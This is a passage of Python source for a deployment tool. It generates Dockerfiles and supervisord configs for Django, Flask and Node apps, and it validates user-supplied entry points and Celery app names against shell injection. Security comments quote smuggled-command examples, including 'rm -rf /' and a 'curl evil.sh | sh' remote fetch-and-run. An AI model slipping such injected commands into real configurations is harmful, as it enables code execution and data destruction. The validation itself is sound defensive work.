from __future__ import annotations

import base64
import re

from .entrypoints import (
    check_package_json,
    check_requirements_txt,
    resolve_django_entrypoint,
    resolve_flask_entrypoint,
    resolve_node_entrypoint,
)
from .exceptions import DeploymentValidationError
from .types import DeploymentConfig
from .project_model import (
    detect_archive_wrapper,
    frontend_info_from_model,
    strip_archive_prefix,
)

from core.global_settings.config import MIRROR_DOCKER

# Security: validate user-supplied celery_app + entry_point overrides
# before they reach supervisord command= lines (which are parsed by sh).
from deployments.common.security import (
    validate_celery_app,
    validate_shell_command,
)


# ---------------------------------------------------------------------------
# Web commands
# ---------------------------------------------------------------------------

def _worker_count_from_config(config) -> int:
    """Always at least 1; read DeploymentConfig.worker_count when present."""
    if config is None:
        return 1
    try:
        return max(1, int(getattr(config, "worker_count", 1) or 1))
    except (TypeError, ValueError):
        return 1


def _align_entry_point_workers(entry_point: str | None, workers: int) -> str | None:
    """
    Ensure a user/detector entry_point uses the same --workers as
    DeploymentConfig.worker_count.  Without this, a suggested command
    like ``gunicorn … --workers 3`` ignores plan-based worker_count.
    """
    if not entry_point:
        return entry_point
    try:
        from deployments.common.config import apply_workers_to_command

        return apply_workers_to_command(entry_point, workers)
    except Exception:
        return entry_point


def _django_web_command(module: str, server_type: str, workers: int = 1) -> str:
    workers = max(1, int(workers or 1))
    if server_type == "asgi":
        return (
            f"uvicorn {module}:application "
            f"--host 0.0.0.0 --port 8000 --workers {workers}"
        )
    return (
        f"gunicorn {module}:application "
        f"--bind 0.0.0.0:8000 --workers {workers} --timeout 60"
    )


def _flask_web_command(
    module: str, callable_name: str, server_type: str, workers: int = 1
) -> str:
    workers = max(1, int(workers or 1))
    target = f"{module}:{callable_name.rstrip('()')}"
    if server_type == "asgi" or "fastapi" in module.lower():
        return (
            f"gunicorn {target} "
            f"--worker-class uvicorn.workers.UvicornWorker "
            f"--bind 0.0.0.0:8000 --workers {workers} --timeout 60"
        )
    return (
        f"gunicorn {target} --bind 0.0.0.0:8000 --workers {workers} --timeout 60"
    )


def _celery_app_name(module: str, override: str | None = None) -> str:
    if override and str(override).strip():
        # SECURITY: validate before interpolation into supervisord command=.
        # Without this, a value like "app; rm -rf /" would be executed
        # by supervisord's sh -c parser.
        return validate_celery_app(str(override).strip())
    parts = (module or "app").split(".")
    return parts[0] if parts else "app"


def _celery_override_from_config(config) -> str | None:
    if config is None:
        return None
    override = getattr(config, "celery_app", None)
    if override:
        return str(override).strip() or None
    env = getattr(config, "environment", None) or {}
    if isinstance(env, dict):
        for key in ("CELERY_APP", "celery_app", "CELERY_MODULE"):
            if env.get(key):
                return str(env[key]).strip() or None
    return None


# ---------------------------------------------------------------------------
# Auto-install runtime packages from config flags
# ---------------------------------------------------------------------------

def _runtime_pip_packages(
    *,
    platform: str,
    server_type: str | None,
    use_celery: bool,
    use_beat: bool,
    web_cmd: str = "",
) -> list[str]:
    packages: list[str] = []
    platform = (platform or "").lower()

    if platform in ("django", "flask", "python"):
        packages.append("gunicorn")

    st = (server_type or "").lower()
    if st == "asgi" or "uvicorn" in (web_cmd or "").lower():
        packages.append("uvicorn[standard]")

    if use_celery:
        packages.extend(["celery", "supervisor"])
        if use_beat:
            packages.append("django-celery-beat")

    seen: set[str] = set()
    ordered: list[str] = []
    for p in packages:
        key = p.lower()
        if key not in seen:
            seen.add(key)
            ordered.append(p)
    return ordered


def _inject_pip_install(dockerfile: str, packages: list[str]) -> str:
    if not packages:
        return dockerfile
    pkgs = " ".join(packages)
    block = (
        "\n\n# --- Runtime deps injected by deployer (from Deploy.config flags) ---\n"
        f"RUN pip install --no-cache-dir {pkgs}\n"
    )
    body = re.sub(
        r"^\s*(CMD|ENTRYPOINT)\s+.*$",
        "",
        dockerfile,
        flags=re.MULTILINE,
    ).rstrip()
    return body + block


def _strip_cmd_entrypoint(dockerfile: str) -> str:
    cleaned = re.sub(r"^\s*(CMD|ENTRYPOINT)\s+.*$", "", dockerfile, flags=re.MULTILINE)
    return cleaned.rstrip()


def _replace_cmd(dockerfile: str, new_cmd: str) -> str:
    cleaned = _strip_cmd_entrypoint(dockerfile)
    parts = new_cmd.split()
    json_array = "[" + ", ".join(f'"{p}"' for p in parts) + "]"
    return cleaned + f"\n\nCMD {json_array}\n"


def _detect_node_package_manager_from_tar(tar_stream) -> str:
    """Detect npm/pnpm/yarn/bun from lockfiles/package.json."""
    try:
        import json as _json
        import tarfile as _tf
        tar_stream.seek(0)
        with _tf.open(fileobj=tar_stream, mode="r:*") as tar:
            names = {m.name.replace("\\", "/").lstrip("./") for m in tar.getmembers()}
            if any(n == "pnpm-lock.yaml" or n.endswith("/pnpm-lock.yaml") for n in names):
                return "pnpm"
            if any(n == "yarn.lock" or n.endswith("/yarn.lock") for n in names):
                return "yarn"
            if any(n in {"bun.lockb", "bun.lock"} or n.endswith("/bun.lockb") or n.endswith("/bun.lock") for n in names):
                return "bun"
            for m in tar.getmembers():
                norm = m.name.replace("\\", "/").lstrip("./")
                if norm not in {"package.json"} and not norm.endswith("/package.json"):
                    continue
                f = tar.extractfile(m)
                if f is None:
                    continue
                try:
                    pkg = _json.loads(f.read().decode("utf-8", "ignore"))
                except Exception:
                    continue
                pm = str(pkg.get("packageManager") or "").split("@", 1)[0].lower()
                if pm in {"npm", "pnpm", "yarn", "bun"}:
                    return pm
                break
    except Exception:
        pass
    finally:
        try:
            tar_stream.seek(0)
        except Exception:
            pass
    return "npm"


def _default_node_install_command(package_manager: str) -> str:
    """Return a safe default install command for a Node project."""
    return {
        "npm": "npm ci || npm install",
        "pnpm": "corepack enable && pnpm install --frozen-lockfile || pnpm install",
        "yarn": "corepack enable && yarn install --frozen-lockfile || yarn install",
        "bun": "npm install -g bun && bun install",
    }.get((package_manager or "npm").lower().strip(), "npm ci || npm install")


def _prepare_node_package_manager(dockerfile: str, package_manager: str) -> str:
    """Make non-npm package managers and their lockfiles available before install."""
    pm = (package_manager or "npm").lower()
    if pm not in {"pnpm", "yarn", "bun"}:
        return dockerfile
    setup = "RUN corepack enable" if pm in {"pnpm", "yarn"} else "RUN npm install -g bun"
    if setup not in dockerfile:
        dockerfile = re.sub(
            r"(WORKDIR\s+/app\s*\n)",
            lambda m: m.group(1) + setup + "\n",
            dockerfile, count=1, flags=re.MULTILINE,
        )
    lock_copy = {
        "pnpm": "COPY pnpm-lock.yaml ./",
        "yarn": "COPY yarn.lock ./",
        "bun": "COPY bun.lockb ./",
    }[pm]
    if lock_copy not in dockerfile:
        dockerfile = re.sub(
            r"(COPY\s+package\*\.json\s+\./\s*\n)",
            lambda m: m.group(1) + lock_copy + "\n",
            dockerfile, count=1, flags=re.MULTILINE,
        )
    return dockerfile


def _swap_npm_install(dockerfile: str, install_cmd: str) -> str:
    """Replace generic npm install RUN with detector-provided command (pnpm/yarn/bun)."""
    patterns = [
        r"RUN npm ci \|\| npm install",
        r"RUN npm ci --omit=dev \|\| npm install --omit=dev",
        r"RUN npm ci",
        r"RUN npm install",
    ]
    for pat in patterns:
        if re.search(pat, dockerfile):
            return re.sub(pat, f"RUN {install_cmd}", dockerfile, count=1)
    return dockerfile


# ---------------------------------------------------------------------------
# Supervisor (web + celery worker [+ beat])
# ---------------------------------------------------------------------------

_SUPERVISOR_CONF_TEMPLATE = """\
[supervisord]
nodaemon=true
logfile=/dev/null
logfile_maxbytes=0
pidfile=/tmp/supervisord.pid

[program:web]
command={web_cmd}
directory=/app
autostart=true
autorestart=true
startsecs=5
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:worker]
command=celery -A {celery_app} worker --loglevel=info --concurrency={concurrency}
directory=/app
autostart=true
autorestart=true
startsecs=10
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0
{beat_section}"""

_SUPERVISOR_BEAT_SECTION = """\
[program:beat]
command=celery -A {celery_app} beat --loglevel=info --scheduler django_celery_beat.schedulers:DatabaseScheduler
directory=/app
autostart=true
autorestart=true
startsecs=10
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0"""


def _build_supervisor_addon(
    web_cmd: str,
    celery_app: str,
    celery_beat: bool,
    *,
    concurrency: int = 1,
) -> str:
    concurrency = max(1, int(concurrency or 1))
    beat_section = (
        _SUPERVISOR_BEAT_SECTION.format(celery_app=celery_app) if celery_beat else ""
    )
    supervisor_conf = _SUPERVISOR_CONF_TEMPLATE.format(
        web_cmd=web_cmd,
        celery_app=celery_app,
        beat_section=beat_section,
        concurrency=concurrency,
    ).strip() + "\n"

    b64 = base64.b64encode(supervisor_conf.encode("utf-8")).decode("ascii")

    lines = [
        "",
        "# --- Supervisor process manager (injected by deployer) ---",
        "RUN mkdir -p /etc/supervisor/conf.d /var/log/supervisor",
        f"RUN echo '{b64}' | base64 -d > /etc/supervisor/conf.d/app.conf",
        "",
        'CMD ["supervisord", "-c", "/etc/supervisor/conf.d/app.conf"]',
    ]
    return "\n".join(lines)


# ---------------------------------------------------------------------------
# Platform renderers
# ---------------------------------------------------------------------------

def _render_django(dockerfile_template, tar_stream, config, logger):
    server_type_override = entry_point_override = None
    use_celery = use_beat = False
    if config is not None:
        server_type_override = config.server_type or None
        # SECURITY: validate user-supplied entry_point override before it
        # flows into supervisord command= or Dockerfile CMD.  Without this,
        # a value like "gunicorn app:app; curl evil.sh | sh" would execute
        # arbitrary shell commands inside the container at runtime.
        _raw_ep = (config.entry_point or "").strip() or None
        if _raw_ep:
            try:
                entry_point_override = validate_shell_command(_raw_ep)
            except DeploymentValidationError:
                # Re-raise with a clearer message
                raise
        else:
            entry_point_override = None
        use_celery = bool(config.celery)
        use_beat = bool(config.celery_beat) and use_celery

    if logger:
        logger.info(
            "entrypoint_detection",
            "Detecting Django ASGI/WSGI entrypoint.",
            progress=12,
        )
    try:
        entrypoint = resolve_django_entrypoint(
            tar_stream, server_type=server_type_override
        )
    except DeploymentValidationError:
        raise
    except Exception as exc:
        raise DeploymentValidationError(
            "Unexpected error during entrypoint detection.",
            stage="entrypoint_detection",
            details={"error": str(exc)},
        ) from exc

    module = entrypoint["module"]
    resolved_server_type = entrypoint["type"]

    if logger and entrypoint.get("override"):
        logger.info(
            "entrypoint_detection",
            f"server_type overridden to '{resolved_server_type}'.",
            progress=13,
            details={"module": module, "server_type": resolved_server_type},
        )

    try:
        rendered = dockerfile_template.format(
            module=module, MIRROR_DOCKER=MIRROR_DOCKER
        )
    except KeyError as exc:
        raise DeploymentValidationError(
            f"Django Dockerfile template contains an unknown placeholder: "
            f"{exc.args[0] if exc.args else 'unknown'}",
            stage="dockerfile_generation",
            details={"module": module},
        ) from exc
    except Exception as exc:
        raise DeploymentValidationError(
            "Django Dockerfile template could not be rendered.",
            stage="dockerfile_generation",
            details={"module": module, "error": str(exc)},
        ) from exc

    install_cmd = None
    try:
        from .platform_bridge import get_project_cfg
        _pc = get_project_cfg(config) if config else None
        install_cmd = getattr(_pc, "install_command", None) if _pc else None
    except Exception:
        pass
    rendered = _prepare_python_dependency_install(rendered, tar_stream, install_cmd)

    workers = _worker_count_from_config(config)

    if entry_point_override and not use_celery:
        web_cmd = _align_entry_point_workers(entry_point_override, workers)
        packages = _runtime_pip_packages(
            platform="django",
            server_type=resolved_server_type,
            use_celery=False,
            use_beat=False,
            web_cmd=web_cmd,
        )
        rendered = _inject_pip_install(rendered, packages)
        return _replace_cmd(rendered, web_cmd)

    web_cmd = (
        _align_entry_point_workers(entry_point_override, workers)
        if entry_point_override
        else _django_web_command(module, resolved_server_type, workers=workers)
    )

    packages = _runtime_pip_packages(
        platform="django",
        server_type=resolved_server_type,
        use_celery=use_celery,
        use_beat=use_beat,
        web_cmd=web_cmd,
    )
    rendered = _inject_pip_install(rendered, packages)

    if use_celery:
        celery_app = _celery_app_name(module, _celery_override_from_config(config))
        if logger:
            logger.info(
                "celery_setup",
                f"Celery enabled (app={celery_app}, beat={use_beat}). "
                f"Injected packages: {packages}",
                progress=14,
                details={
                    "celery_app": celery_app,
                    "celery_beat": use_beat,
                    "web_cmd": web_cmd,
                    "packages": packages,
                },
            )
        addon = _build_supervisor_addon(web_cmd, celery_app, use_beat, concurrency=workers)
        rendered = _strip_cmd_entrypoint(rendered)
        return rendered + "\n" + addon

    rendered = _replace_cmd(rendered, web_cmd)
    return rendered

def _archive_names(tar_stream) -> set[str]:
    try:
        import tarfile as _tf
        tar_stream.seek(0)
        with _tf.open(fileobj=tar_stream, mode="r:*") as tar:
            return {m.name.replace("\\", "/").lstrip("./") for m in tar.getmembers()}
    except Exception:
        return set()
    finally:
        try:
            tar_stream.seek(0)
        except Exception:
            pass


def _python_dependency_manifest(tar_stream) -> str:
    names = _archive_names(tar_stream)
    if any(n == "requirements.txt" or n.endswith("/requirements.txt") for n in names):
        return "requirements"
    if any(n == "Pipfile" or n.endswith("/Pipfile") for n in names):
        return "pipenv"
    if any(n == "pyproject.toml" or n.endswith("/pyproject.toml") for n in names):
        return "pyproject"
    return "requirements"


def _prepare_python_dependency_install(dockerfile: str, tar_stream, install_cmd: str | None) -> str:
    manifest = _python_dependency_manifest(tar_stream)
    if manifest == "requirements":
        return dockerfile

    dockerfile = re.sub(r"^COPY\s+requirements\.txt\s+/app/?\s*$", "", dockerfile, flags=re.MULTILINE)
    # Drop the stock pip -r requirements layer only; keep later runtime-package injection intact.
    dockerfile = re.sub(
        r"^RUN\s+pip install[^\n]*requirements\.txt[^\n]*(?:\n(?:\s{2,}.*))*",
        "", dockerfile, count=1, flags=re.MULTILINE,
    )
    dockerfile = re.sub(r"^\s*&&\s*pip install .*?(?:gunicorn|uvicorn).*?$", "", dockerfile, flags=re.MULTILINE)

    if manifest == "pipenv":
        lock = "COPY Pipfile.lock /app/\n" if any(n == "Pipfile.lock" or n.endswith("/Pipfile.lock") for n in _archive_names(tar_stream)) else ""
        block = (
            "\n# --- Pipenv dependency install ---\n"
            "WORKDIR /app\n"
            "COPY Pipfile /app/\n" + lock +
            "RUN pip install --no-cache-dir pipenv \
"
            "    && pipenv install --deploy --system\n"
        )
    else:
        lock = "COPY poetry.lock /app/\n" if any(n == "poetry.lock" or n.endswith("/poetry.lock") for n in _archive_names(tar_stream)) else ""
        if "poetry" in (install_cmd or "").lower() or lock:
            block = (
                "\n# --- Poetry dependency install ---\n"
                "WORKDIR /app\n"
                "COPY pyproject.toml /app/\n" + lock +
                "RUN pip install --no-cache-dir poetry \
"
                "    && poetry config virtualenvs.create false \
"
                "    && poetry install --only main --no-interaction --no-ansi\n"
            )
        else:
            block = (
                "\n# --- PEP 517 dependency install ---\n"
                "WORKDIR /app\n"
                "COPY pyproject.toml /app/\n"
            )
            non_poetry_install = True

    m=re.search(r"^COPY\s+\.\s+/app/?\s*$", dockerfile, flags=re.MULTILINE)
    if m:
        dockerfile=dockerfile[:m.start()]+block.rstrip()+"\n"+dockerfile[m.start():]
        if 'non_poetry_install' in locals():
            insert_at = m.start() + len(block.rstrip()) + 1 + len("COPY . /app")
            # Avoid relying on the exact source COPY spelling by inserting after the first matched COPY line.
            source_end = dockerfile.find("\n", m.start() + len(block.rstrip()) + 1)
            if source_end != -1:
                dockerfile = dockerfile[:source_end+1] + "RUN pip install --no-cache-dir .\n" + dockerfile[source_end+1:]
    else:
        dockerfile=dockerfile.rstrip()+"\n"+block
        if 'non_poetry_install' in locals():
            dockerfile += "RUN pip install --no-cache-dir .\n"
    return dockerfile


def _render_flask_or_python(platform, dockerfile_template, tar_stream, config, logger):
    server_type_override = entry_point_override = None
    use_celery = use_beat = False
    if config is not None:
        server_type_override = config.server_type or None
        # SECURITY: validate user-supplied entry_point override before it
        # flows into supervisord command= or Dockerfile CMD.  Without this,
        # a value like "gunicorn app:app; curl evil.sh | sh" would execute
        # arbitrary shell commands inside the container at runtime.
        _raw_ep = (config.entry_point or "").strip() or None
        if _raw_ep:
            try:
                entry_point_override = validate_shell_command(_raw_ep)
            except DeploymentValidationError:
                # Re-raise with a clearer message
                raise
        else:
            entry_point_override = None
        use_celery = bool(config.celery)
        use_beat = bool(config.celery_beat) and use_celery

    if logger:
        logger.info(
            "entrypoint_detection",
            f"Detecting {platform} application entrypoint.",
            progress=12,
        )
    entrypoint = resolve_flask_entrypoint(
        tar_stream, server_type=server_type_override
    )
    module = entrypoint.get("module", "app")
    callable_name = entrypoint.get("callable", "app")
    resolved_type = entrypoint.get("type", "wsgi")

    try:
        rendered = dockerfile_template.format(
            module=module, MIRROR_DOCKER=MIRROR_DOCKER
        )
    except Exception:
        rendered = dockerfile_template.replace("{MIRROR_DOCKER}", MIRROR_DOCKER)

    # Flask/Python templates must never leave {build_dir}/{port} unexpanded.
    # Use safe defaults (SPA helpers are irrelevant here).
    rendered = rendered.replace("{build_dir}", "dist")
    port = getattr(config, "port", None) if config is not None else None
    rendered = _ensure_port_placeholder(rendered, port)

    install_cmd = None
    try:
        from .platform_bridge import get_project_cfg
        _pc = get_project_cfg(config) if config else None
        install_cmd = getattr(_pc, "install_command", None) if _pc else None
    except Exception:
        pass
    rendered = _prepare_python_dependency_install(rendered, tar_stream, install_cmd)

    workers = _worker_count_from_config(config)

    if entry_point_override and not use_celery:
        web_cmd = _align_entry_point_workers(entry_point_override, workers)
        packages = _runtime_pip_packages(
            platform=platform,
            server_type=resolved_type,
            use_celery=False,
            use_beat=False,
            web_cmd=web_cmd,
        )
        rendered = _inject_pip_install(rendered, packages)
        return _replace_cmd(rendered, web_cmd)

    web_cmd = (
        _align_entry_point_workers(entry_point_override, workers)
        if entry_point_override
        else _flask_web_command(module, callable_name, resolved_type, workers=workers)
    )

    packages = _runtime_pip_packages(
        platform=platform,
        server_type=resolved_type,
        use_celery=use_celery,
        use_beat=use_beat,
        web_cmd=web_cmd,
    )
    rendered = _inject_pip_install(rendered, packages)

    if use_celery:
        celery_app = _celery_app_name(module, _celery_override_from_config(config))
        if logger:
            logger.info(
                "celery_setup",
                f"Celery enabled (app={celery_app}, beat={use_beat}). "
                f"Injected packages: {packages}",
                progress=14,
                details={
                    "celery_app": celery_app,
                    "celery_beat": use_beat,
                    "packages": packages,
                },
            )
        addon = _build_supervisor_addon(web_cmd, celery_app, use_beat, concurrency=workers)
        rendered = _strip_cmd_entrypoint(rendered)
        return rendered + "\n" + addon

    rendered = _replace_cmd(rendered, web_cmd)
    if platform == "flask" and "FLASK_APP" not in rendered:
        rendered = rendered.replace(
            "WORKDIR /app",
            f"WORKDIR /app\nENV FLASK_APP={module}.py\nENV FLASK_ENV=production",
        )
    return rendered

def _default_spa_build_dir(platform: str, framework: str | None = None) -> str:
    """
    Sensible default static output directory per platform / framework.

    CRA → build, Vite/Vue/Angular → dist.  React without a clear signal
    defaults to dist because modern React (Vite) is far more common than
    CRA in 2024+.
    """
    platform = (platform or "").lower().strip()
    framework = (framework or "").lower().strip()

    if framework in ("cra", "create-react-app") or (
        platform == "react" and framework in ("react", "cra")
    ):
        # Only force "build" when we positively identified CRA
        if framework in ("cra", "create-react-app"):
            return "build"

    if platform in ("vuejs", "vue", "angular", "vite") or framework in (
        "vite",
        "vite-react",
        "vite-vue",
        "vue",
        "angular",
    ):
        return "dist"

    if platform == "react":
        # Prefer dist (Vite) over build (CRA) when ambiguous
        return "dist"

    return "dist"


def _resolve_spa_build_dir(
    platform: str,
    project_cfg,
    info: dict | None,
    tar_stream=None,
    *,
    user_build_dir: str | None = None,
) -> str:
    """
    Pick the directory that ``npm run build`` actually produces.

    Priority (highest first)
    ------------------------
    1. Explicit user override (Deploy.config["build_dir"])
    2. Evidence from the deployment archive (vite vs react-scripts)
    3. ProjectConfig from platforms/ detector (inspect wins over defaults)
    4. Framework / platform heuristics (Vite/Vue/Angular → dist, CRA → build)
    """
    # 1. User override
    if user_build_dir and str(user_build_dir).strip():
        return str(user_build_dir).strip().lstrip("./").rstrip("/")

    # 2. Archive signals – most reliable for the actual zip being built
    tar_signal = _detect_build_dir_from_tar(tar_stream)
    if tar_signal:
        return tar_signal

    # 3. Detector ProjectConfig (only trust non-default-ish values when framework known)
    if project_cfg is not None:
        fw = (getattr(project_cfg, "framework", None) or "").lower()
        for attr in ("build_dir", "output_dir", "static_dir", "publish_dir"):
            val = getattr(project_cfg, attr, None)
            if val and str(val).strip():
                d = str(val).strip().lstrip("./").rstrip("/")
                # If detector says vite-* never keep CRA "build"
                if fw in ("vite-react", "vite", "vite-vue", "vue", "angular") and d == "build":
                    return "dist"
                if fw in ("cra", "create-react-app") and d == "dist":
                    return "build"
                return d
        return _default_spa_build_dir(platform, fw or (info or {}).get("framework"))

    fw = (info or {}).get("framework")
    return _default_spa_build_dir(platform, fw)


def _detect_build_dir_from_tar(tar_stream) -> str | None:
    """Return 'dist' / 'build' / custom outDir based on files inside the tar."""
    if tar_stream is None:
        return None
    try:
        import json
        import tarfile as _tf

        tar_stream.seek(0)
        with _tf.open(fileobj=tar_stream, mode="r:*") as tar:
            vite_cfg_names = (
                "vite.config.ts",
                "vite.config.js",
                "vite.config.mjs",
                "vite.config.cjs",
            )

            has_vite_config = False
            has_react_scripts = False
            has_vite_dep = False
            vite_config_text = None

            for member in tar.getmembers():
                n = member.name.replace("\\", "/")
                base = n.rsplit("/", 1)[-1]
                depth = 0 if "/" not in n else n.count("/")

                if base in vite_cfg_names and depth <= 2:
                    has_vite_config = True
                    fobj = tar.extractfile(member)
                    if fobj is not None and vite_config_text is None:
                        vite_config_text = fobj.read().decode("utf-8", "ignore")

                if base == "package.json" and depth <= 1:
                    fobj = tar.extractfile(member)
                    if fobj is None:
                        continue
                    try:
                        pkg = json.loads(fobj.read().decode("utf-8", "ignore"))
                    except Exception:
                        continue
                    deps = {
                        **(pkg.get("dependencies") or {}),
                        **(pkg.get("devDependencies") or {}),
                    }
                    if "react-scripts" in deps:
                        has_react_scripts = True
                    if "vite" in deps or "@vitejs/plugin-react" in deps:
                        has_vite_dep = True

            if has_vite_config or has_vite_dep:
                if vite_config_text:
                    m = re.search(
                        r"outDir\s*:\s*['\"]([^'\"]+)['\"]",
                        vite_config_text,
                        re.DOTALL | re.IGNORECASE,
                    )
                    if m:
                        tar_stream.seek(0)
                        return m.group(1).strip().lstrip("./").rstrip("/")
                tar_stream.seek(0)
                return "dist"

            if has_react_scripts:
                tar_stream.seek(0)
                return "build"

        tar_stream.seek(0)
    except Exception:
        try:
            tar_stream.seek(0)
        except Exception:
            pass
    return None



def _is_nginx_spa_template(dockerfile: str) -> bool:
    """True when the template is a multi-stage build that serves via nginx."""
    lower = dockerfile.lower()
    return (
        "nginx" in lower
        and "copy --from=builder" in lower
        and ("/usr/share/nginx/html" in lower or "nginx -g" in lower)
    )


def _fix_spa_copy_paths(dockerfile: str, build_dir: str) -> str:
    """
    Rewrite SPA stage-2 COPY paths so they match the real build output.

    Handles both:
      * literal paths:  COPY --from=builder /app/build ...
      * placeholders:   COPY --from=builder /app/{build_dir} ...
    """
    build_dir = (build_dir or "dist").strip().lstrip("./").rstrip("/")
    if not build_dir:
        build_dir = "dist"

    # 1. Replace explicit placeholder if the template still has it
    dockerfile = dockerfile.replace("{build_dir}", build_dir)

    # 2. Rewrite literal COPY --from=builder /app/<old> lines
    pattern = re.compile(
        r"(COPY\s+--from=builder\s+)/app/([^\s]+)",
        re.IGNORECASE,
    )

    def _sub(match: re.Match) -> str:
        prefix = match.group(1)
        old_path = match.group(2).rstrip("/")
        # Strip residual placeholder braces just in case
        old_path = old_path.replace("{", "").replace("}", "")
        first = old_path.split("/", 1)[0]
        if first in ("build", "dist", "out", "public", "www") or old_path == build_dir:
            return f"{prefix}/app/{build_dir}"
        return match.group(0)

    return pattern.sub(_sub, dockerfile)



def _is_nginx_compatible_cmd(cmd: str) -> bool:
    """True when CMD is safe to run inside nginx:alpine (no node runtime)."""
    c = (cmd or "").strip().lower()
    if not c:
        return False
    tokens = c.replace(",", " ").split()
    if tokens and tokens[0] in {"npx", "npm", "node", "yarn", "pnpm", "bun"}:
        return False
    if "serve" in tokens and "nginx" not in tokens:
        return False
    return bool(tokens) and (tokens[0] == "nginx" or c.startswith("/usr/sbin/nginx"))


def _resolve_spa_port(config, project_cfg, platform: str) -> int:
    """
    Port nginx listens on inside the container.

    Priority:
      1. Explicit DeploymentConfig.port (from Deploy.config["port"])
      2. Default 80 for nginx SPA (ignore CRA/Vite/Angular dev ports)
    """
    if config is not None and getattr(config, "port", None) is not None:
        try:
            p = int(config.port)
            if 1 <= p <= 65535:
                return p
        except (TypeError, ValueError):
            pass
    return 80


def _apply_spa_port(dockerfile: str, port: int) -> str:
    """Rewrite EXPOSE and, when port != 80, inject nginx default.conf."""
    import base64

    try:
        port = int(port)
    except (TypeError, ValueError):
        port = 80
    if not (1 <= port <= 65535):
        port = 80

    dockerfile = re.sub(
        r"^EXPOSE\s+\d+\s*$",
        f"EXPOSE {port}",
        dockerfile,
        flags=re.MULTILINE | re.IGNORECASE,
    )
    if not re.search(r"^EXPOSE\s+", dockerfile, re.MULTILINE | re.IGNORECASE):
        dockerfile = re.sub(
            r"(^CMD\s+)",
            f"EXPOSE {port}\n\n\\1",
            dockerfile,
            count=1,
            flags=re.MULTILINE,
        )

    if port == 80:
        return dockerfile

    conf = (
        "server {\n"
        f"    listen {port};\n"
        "    server_name _;\n"
        "    root /usr/share/nginx/html;\n"
        "    index index.html;\n"
        "    location / {\n"
        "        try_files $uri $uri/ /index.html;\n"
        "    }\n"
        "}\n"
    )
    b64 = base64.b64encode(conf.encode("utf-8")).decode("ascii")
    inject = (
        f"\n# SPA listen port override ({port})\n"
        f"RUN echo '{b64}' | base64 -d > /etc/nginx/conf.d/default.conf\n"
    )
    # Insert just before the last EXPOSE (final stage)
    matches = list(re.finditer(r"^EXPOSE\s+\d+\s*$", dockerfile, re.MULTILINE | re.IGNORECASE))
    if matches:
        m = matches[-1]
        dockerfile = dockerfile[: m.start()] + inject + dockerfile[m.start() :]
    else:
        dockerfile = dockerfile.rstrip() + "\n" + inject
    return dockerfile


def _render_node_family(platform, dockerfile_template, tar_stream, config, logger):
    """
    Render Node / Next.js / React / Vue / Angular / Vite Dockerfiles.

    Rules
    -----
    * Multi-stage nginx SPA templates (react, vue, angular, static-like):
      - Fix the builder→nginx COPY path so it matches the real build output
        (CRA ``build``, Vite/Vue ``dist``, Angular ``dist/<project>``, …).
      - Keep the nginx CMD; do NOT replace it with ``npx serve``.
    * Runtime Node apps (nextjs, express, plain nodejs):
      - Honour user entry_point, then ProjectConfig.start_command, then template.
    * Package-manager install line is always swapped when detector provides one.
    """
    entry_point_override = None
    if config is not None:
        # SECURITY: validate user-supplied entry_point override before it
        # flows into supervisord command= or Dockerfile CMD.  Without this,
        # a value like "gunicorn app:app; curl evil.sh | sh" would execute
        # arbitrary shell commands inside the container at runtime.
        _raw_ep = (config.entry_point or "").strip() or None
        if _raw_ep:
            try:
                entry_point_override = validate_shell_command(_raw_ep)
            except DeploymentValidationError:
                # Re-raise with a clearer message
                raise
        else:
            entry_point_override = None

    project_cfg = None
    try:
        from .platform_bridge import get_project_cfg
        project_cfg = get_project_cfg(config) if config else None
    except Exception:
        project_cfg = None

    info = resolve_node_entrypoint(tar_stream) or {}

    # User may pass build_dir via Deploy.config → environment or a top-level field
    user_bd = None
    if config is not None:
        user_bd = getattr(config, "build_dir", None)
        if not user_bd and isinstance(getattr(config, "environment", None), dict):
            user_bd = config.environment.get("BUILD_DIR") or config.environment.get("build_dir")
    build_dir = _resolve_spa_build_dir(
        platform,
        project_cfg,
        info,
        tar_stream=tar_stream,
        user_build_dir=user_bd,
    )

    if logger:
        logger.info(
            "entrypoint_detection",
            f"Node package detected (framework={info.get('framework')}).",
            progress=12,
            details={
                **info,
                "from_platforms": bool(project_cfg),
                "package_manager": getattr(project_cfg, "package_manager", None) if project_cfg else None,
                "start_command": getattr(project_cfg, "start_command", None) if project_cfg else None,
                "build_dir": build_dir,
                "detected_build_dir": getattr(project_cfg, "build_dir", None) if project_cfg else None,
            },
        )

    rendered = dockerfile_template.replace("{MIRROR_DOCKER}", MIRROR_DOCKER)

    package_manager = (getattr(config, "package_manager", None) if config else None) or (getattr(project_cfg, "package_manager", None) if project_cfg else None) or _detect_node_package_manager_from_tar(tar_stream)
    rendered = _prepare_node_package_manager(rendered, package_manager)
    install_cmd = (getattr(config, "install_command", None) if config else None) or (getattr(project_cfg, "install_command", None) if project_cfg else None)
    build_cmd = (getattr(config, "build_command", None) if config else None) or (getattr(project_cfg, "build_command", None) if project_cfg else None)

    # Global Node/React templates use deployment-time tokens. Commands are
    # resolved only after project detection, so React/Vite/CRA do not depend
    # on a hard-coded global `npm run build`.
    if "__DEPLOY_INSTALL_COMMAND__" in rendered:
        rendered = rendered.replace(
            "__DEPLOY_INSTALL_COMMAND__",
            f"RUN {str(install_cmd or _default_node_install_command(package_manager)).strip()}",
        )
    elif install_cmd:
        rendered = _swap_npm_install(rendered, str(install_cmd))

    if "__DEPLOY_BUILD_COMMAND__" in rendered:
        rendered = rendered.replace(
            "__DEPLOY_BUILD_COMMAND__",
            f"RUN {str(build_cmd or f'{package_manager} run build').strip()}",
        )
    elif build_cmd and re.search(r"^RUN\s+[^\n]*(?:npm|pnpm|yarn|bun)\s+(?:run\s+)?build[^\n]*$", rendered, re.M):
        rendered = re.sub(r"^RUN\s+[^\n]*(?:npm|pnpm|yarn|bun)\s+(?:run\s+)?build[^\n]*$", f"RUN {str(build_cmd).strip()}", rendered, count=1, flags=re.M)

    # Always correct SPA copy paths when the template is nginx multi-stage
    if _is_nginx_spa_template(rendered):
        before = rendered
        rendered = _fix_spa_copy_paths(rendered, build_dir)

        # Resolve listen port for nginx (default 80). User may override via
        # DeploymentConfig.port / Deploy.config["port"].
